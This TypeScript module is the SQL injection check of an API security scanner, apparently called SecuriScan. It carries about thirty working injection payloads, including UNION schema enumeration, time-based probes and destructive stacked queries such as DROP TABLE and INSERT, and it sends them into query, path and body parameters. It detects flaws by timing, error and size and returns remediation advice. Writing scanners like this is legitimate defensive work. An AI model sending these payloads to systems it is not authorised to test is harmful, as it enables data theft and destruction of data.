import { AxiosResponse } from "axios";
import { scannerClient } from "@/server/core/http/scanner-client";
import { SecurityCheck, ScanTarget, FindingResult, Evidence } from "@/types";
import { logger } from "@/server/core/logging/logger";

const log = logger.child("sqli-check");

/* ─── SQL Injection Payloads organized by technique ─── */
const SQLI_PAYLOADS: { payload: string; label: string; technique: string }[] = [
    // Classic tautology-based
    { payload: "' OR '1'='1", label: "Tautology OR bypass", technique: "tautology" },
    { payload: "' OR '1'='1'--", label: "Tautology with comment", technique: "tautology" },
    { payload: "' OR '1'='1'/*", label: "Tautology with block comment", technique: "tautology" },
    { payload: "\" OR \"1\"=\"1", label: "Double-quote tautology", technique: "tautology" },
    { payload: "1 OR 1=1", label: "Numeric tautology", technique: "tautology" },
    { payload: "1' OR '1'='1' UNION SELECT NULL--", label: "Union tautology combo", technique: "tautology" },

    // Union-based extraction
    { payload: "' UNION SELECT NULL--", label: "UNION single NULL", technique: "union" },
    { payload: "' UNION SELECT NULL,NULL--", label: "UNION double NULL", technique: "union" },
    { payload: "' UNION SELECT NULL,NULL,NULL--", label: "UNION triple NULL", technique: "union" },
    { payload: "' UNION SELECT 1,user(),version()--", label: "UNION user + version extraction", technique: "union" },
    { payload: "' UNION ALL SELECT NULL,table_name,NULL FROM information_schema.tables--", label: "UNION schema enumeration", technique: "union" },

    // Error-based
    { payload: "'", label: "Single quote (error trigger)", technique: "error-based" },
    { payload: "''", label: "Double single-quote", technique: "error-based" },
    { payload: "1'1", label: "Quote mid-number", technique: "error-based" },
    { payload: "' AND 1=CONVERT(int,(SELECT @@version))--", label: "CONVERT error extraction (MSSQL)", technique: "error-based" },
    { payload: "' AND EXTRACTVALUE(1,CONCAT(0x7e,version()))--", label: "EXTRACTVALUE error extraction (MySQL)", technique: "error-based" },

    // Blind boolean-based
    { payload: "' AND 1=1--", label: "Blind boolean TRUE", technique: "blind-boolean" },
    { payload: "' AND 1=2--", label: "Blind boolean FALSE", technique: "blind-boolean" },
    { payload: "' AND SUBSTRING(@@version,1,1)='5'--", label: "Blind version probe", technique: "blind-boolean" },

    // Blind time-based
    { payload: "' AND SLEEP(3)--", label: "MySQL time-based (SLEEP)", technique: "time-based" },
    { payload: "'; WAITFOR DELAY '0:0:3'--", label: "MSSQL time-based (WAITFOR)", technique: "time-based" },
    { payload: "' AND pg_sleep(3)--", label: "PostgreSQL time-based (pg_sleep)", technique: "time-based" },
    { payload: "1' AND (SELECT * FROM (SELECT SLEEP(3))a)--", label: "Subquery SLEEP", technique: "time-based" },

    // Stacked queries
    { payload: "'; DROP TABLE users--", label: "Stacked DROP TABLE", technique: "stacked" },
    { payload: "'; INSERT INTO users VALUES('hacker','hacked')--", label: "Stacked INSERT", technique: "stacked" },

    // Comment-based evasion
    { payload: "'/**/OR/**/1=1--", label: "Comment-space bypass", technique: "evasion" },
    { payload: "' /*!50000OR*/ 1=1--", label: "MySQL versioned comment bypass", technique: "evasion" },
    { payload: "' %4fR 1=1--", label: "URL-encoding evasion", technique: "evasion" },
];

/* ─── SQL Error Signatures ─── */
const SQL_ERROR_SIGNATURES = [
    "sql syntax", "mysql", "mariadb", "postgresql", "sqlite", "oracle",
    "microsoft sql", "mssql", "syntax error", "unterminated string",
    "quoted string not properly terminated", "unexpected end of sql",
    "pg_query", "pg_exec", "mysql_fetch", "ORA-", "PLS-",
    "SQLite3::", "SQLSTATE", "ODBC Driver", "JDBC", "hibernate",
    "near \"", "WHERE clause", "GROUP BY", "ORDER BY",
    "invalid input syntax", "permission denied for relation",
    "division by zero", "invalid column", "column does not exist",
    "table or view does not exist", "procedure", "function",
];

export class SqlInjectionCheck implements SecurityCheck {
    name = "SQL Injection Check";
    description = "Tests for SQL Injection vulnerabilities using tautology, UNION-based, error-based, blind boolean, time-based, and stacked query techniques.";
    owaspMapping = "Injection";
    owaspId = "API8:2023";

    async run(target: ScanTarget): Promise<FindingResult[]> {
        const findings: FindingResult[] = [];
        const foundEndpoints = new Set<string>();

        for (const endpoint of target.endpoints) {
            const url = `${target.baseUrl}${endpoint.path}`;
            const endpointKey = `${endpoint.method}:${endpoint.path}`;

            /* ── Get baseline response for comparison ── */
            let baselineBody = "";
            let baselineStatus = 0;
            let baselineTime = 0;
            try {
                const headers: Record<string, string> = {
                    "User-Agent": "SecuriScan/1.0",
                    ...(endpoint.customHeaders || {}),
                };
                if (target.authConfig?.value) {
                    headers["Authorization"] = target.authConfig.type === "api_key"
                        ? target.authConfig.value
                        : `Bearer ${target.authConfig.value}`;
                }
                const start = Date.now();
                const baseResp = await scannerClient({
                    requestsPerSecond: target.requestsPerSecond,
                    method: endpoint.method.toLowerCase(),
                    url,
                    timeout: 15000,
                    validateStatus: () => true,
                    headers,
                });
                baselineTime = Date.now() - start;
                baselineStatus = baseResp.status;
                baselineBody = typeof baseResp.data === "string" ? baseResp.data : JSON.stringify(baseResp.data || "");
            } catch {
                continue;
            }

            /* ── Test injection points ── */
            for (const { payload, label, technique } of SQLI_PAYLOADS) {
                if (foundEndpoints.has(endpointKey) && technique !== "time-based") continue;

                try {
                    const injectionUrls = this.buildInjectionUrls(url, endpoint, payload);

                    for (const injUrl of injectionUrls) {
                        const headers: Record<string, string> = {
                            "User-Agent": "SecuriScan/1.0",
                            "Content-Type": "application/json",
                            ...(endpoint.customHeaders || {}),
                        };
                        if (target.authConfig?.value) {
                            headers["Authorization"] = target.authConfig.type === "api_key"
                                ? target.authConfig.value
                                : `Bearer ${target.authConfig.value}`;
                        }

                        const requestConfig: Record<string, unknown> = {
                            requestsPerSecond: target.requestsPerSecond,
                            method: endpoint.method.toLowerCase(),
                            url: injUrl.url,
                            timeout: technique === "time-based" ? 15000 : 10000,
                            validateStatus: () => true,
                            headers,
                        };

                        if (injUrl.body) {
                            requestConfig.data = injUrl.body;
                        }

                        const start = Date.now();
                        const response = await scannerClient(requestConfig);
                        const elapsed = Date.now() - start;
                        const responseBody = typeof response.data === "string" ? response.data : JSON.stringify(response.data || "");

                        let isVulnerable = false;
                        let evidenceDesc = "";

                        // Time-based: check if response was significantly delayed
                        if (technique === "time-based") {
                            if (elapsed > baselineTime + 2500) {
                                isVulnerable = true;
                                evidenceDesc = `Time-based SQLi detected. Baseline: ${baselineTime}ms, Injected: ${elapsed}ms (diff: ${elapsed - baselineTime}ms). The SLEEP/WAITFOR/pg_sleep payload delayed the response significantly.`;
                            }
                        }
                        // Error-based: check for SQL error messages leaked
                        else if (technique === "error-based") {
                            const lowerBody = responseBody.toLowerCase();
                            const matched = SQL_ERROR_SIGNATURES.filter(sig => lowerBody.includes(sig.toLowerCase()));
                            if (matched.length > 0 && response.status >= 400) {
                                isVulnerable = true;
                                evidenceDesc = `SQL error messages leaked in response: ${matched.join(", ")}. The server exposes database error details which confirms SQL query processing of user input.`;
                            }
                        }
                        // Boolean-based: compare responses
                        else if (technique === "blind-boolean" && label.includes("TRUE")) {
                            // TRUE condition should return same as baseline
                            if (response.status === baselineStatus && Math.abs(responseBody.length - baselineBody.length) < 50) {
                                // Now test FALSE condition
                                const falsePayload = SQLI_PAYLOADS.find(p => p.label === "Blind boolean FALSE");
                                if (falsePayload) {
                                    const falseUrls = this.buildInjectionUrls(url, endpoint, falsePayload.payload);
                                    for (const fUrl of falseUrls) {
                                        const fResp = await scannerClient({
                                            requestsPerSecond: target.requestsPerSecond,
                                            method: endpoint.method.toLowerCase(),
                                            url: fUrl.url,
                                            timeout: 10000,
                                            validateStatus: () => true,
                                            headers,
                                            data: fUrl.body,
                                        });
                                        const fBody = typeof fResp.data === "string" ? fResp.data : JSON.stringify(fResp.data || "");
                                        if (fResp.status !== response.status || Math.abs(fBody.length - responseBody.length) > 100) {
                                            isVulnerable = true;
                                            evidenceDesc = `Blind boolean SQLi detected. TRUE condition returned status ${response.status} (${responseBody.length} bytes), FALSE condition returned status ${fResp.status} (${fBody.length} bytes). The application behaves differently based on injected SQL boolean logic.`;
                                        }
                                        break;
                                    }
                                }
                            }
                        }
                        // Tautology / Union / Stacked: check for unexpected data or status changes
                        else {
                            const lowerBody = responseBody.toLowerCase();
                            const sigMatches = SQL_ERROR_SIGNATURES.filter(sig => lowerBody.includes(sig.toLowerCase()));

                            // Returned more data than baseline (possible data leak)
                            if (response.status >= 200 && response.status < 300 && responseBody.length > baselineBody.length + 200) {
                                isVulnerable = true;
                                evidenceDesc = `Tautology/UNION SQLi suspected. The injected payload caused the response to return significantly more data (${responseBody.length} bytes vs baseline ${baselineBody.length} bytes), suggesting additional database records were leaked.`;
                            }
                            // SQL errors leaked
                            else if (sigMatches.length > 0) {
                                isVulnerable = true;
                                evidenceDesc = `SQL error signatures detected in response: ${sigMatches.join(", ")}. The payload triggered database error processing.`;
                            }
                        }

                        if (isVulnerable) {
                            foundEndpoints.add(endpointKey);
                            findings.push({
                                checkType: "sql-injection",
                                severity: technique === "time-based" || technique === "stacked" ? "CRITICAL" : "HIGH",
                                title: `SQL Injection (${label}): ${endpoint.method} ${endpoint.path}`,
                                description: `${evidenceDesc}\n\nPayload used: ${payload}\nTechnique: ${technique}`,
                                evidence: this.buildEvidence(injUrl.url, endpoint.method, headers, response, payload, elapsed),
                                owaspMapping: this.owaspMapping,
                                owaspId: this.owaspId,
                                remediation: this.getRemediation(technique),
                                endpoint: endpoint.path,
                                method: endpoint.method,
                            });
                            break;
                        }
                    }
                } catch (err) {
                    log.debug(`SQLi test skipped for ${url} [${label}]: ${err instanceof Error ? err.message : String(err)}`);
                }
            }
        }

        return findings;
    }

    private buildInjectionUrls(baseUrl: string, endpoint: { path: string; method: string; parameters?: { name: string; in: string }[]; requestBody?: string }, payload: string): { url: string; body?: unknown }[] {
        const results: { url: string; body?: unknown }[] = [];
        const encoded = encodeURIComponent(payload);

        // Inject into query parameters
        const params = endpoint.parameters?.filter(p => p.in === "query") || [];
        if (params.length > 0) {
            for (const param of params) {
                const sep = baseUrl.includes("?") ? "&" : "?";
                results.push({ url: `${baseUrl}${sep}${param.name}=${encoded}` });
            }
        } else {
            // Fallback: inject common parameter names
            for (const name of ["id", "search", "q", "name", "user", "email", "filter", "sort", "order"]) {
                const sep = baseUrl.includes("?") ? "&" : "?";
                results.push({ url: `${baseUrl}${sep}${name}=${encoded}` });
                break; // Only test first common param to keep it efficient
            }
        }

        // Inject into path parameters (replace numeric IDs)
        const pathInjected = baseUrl.replace(/\/(\d+)(\/|$)/g, `/${encoded}$2`);
        if (pathInjected !== baseUrl) {
            results.push({ url: pathInjected });
        }

        // Inject into request body for POST/PUT/PATCH
        if (["post", "put", "patch"].includes(endpoint.method.toLowerCase())) {
            if (endpoint.requestBody) {
                try {
                    const body = JSON.parse(endpoint.requestBody);
                    // Inject into first string field
                    for (const key of Object.keys(body)) {
                        if (typeof body[key] === "string" || typeof body[key] === "number") {
                            results.push({ url: baseUrl, body: { ...body, [key]: payload } });
                            break;
                        }
                    }
                } catch {
                    results.push({ url: baseUrl, body: { input: payload } });
                }
            } else {
                results.push({ url: baseUrl, body: { id: payload, search: payload } });
            }
        }

        return results.length > 0 ? results : [{ url: `${baseUrl}${baseUrl.includes("?") ? "&" : "?"}id=${encoded}` }];
    }

    private getRemediation(technique: string): string {
        return "Use parameterized queries / prepared statements to prevent SQL injection:\n\n" +
            "```javascript\n" +
            "//  VULNERABLE\n" +
            "const query = `SELECT * FROM users WHERE id = '${req.params.id}'`;\n\n" +
            "//  SECURE — Parameterized query\n" +
            "const query = 'SELECT * FROM users WHERE id = $1';\n" +
            "const result = await pool.query(query, [req.params.id]);\n\n" +
            "//  SECURE — Using an ORM (Prisma)\n" +
            "const user = await prisma.user.findFirst({\n" +
            "  where: { id: req.params.id }\n" +
            "});\n" +
            "```\n\n" +
            "Additional defenses:\n" +
            "- Use an ORM (Prisma, Sequelize, TypeORM) with parameterized queries\n" +
            "- Implement input validation (allow-listing expected patterns)\n" +
            "- Apply the principle of least privilege to database accounts\n" +
            "- Deploy a Web Application Firewall (WAF) as defense-in-depth\n\n" +
            "Detection technique: " + technique;
    }

    private buildEvidence(url: string, method: string, headers: Record<string, string>, response: AxiosResponse, payload: string, responseTime: number): Evidence {
        return {
            request: { url, method, headers },
            response: {
                status: response.status,
                headers: response.headers as Record<string, string>,
                body: typeof response.data === "object" ? response.data : String(response.data).slice(0, 500),
                responseTime,
            },
            description: `SQLi probe sent to ${method} ${url}`,
            payload,
        };
    }
}
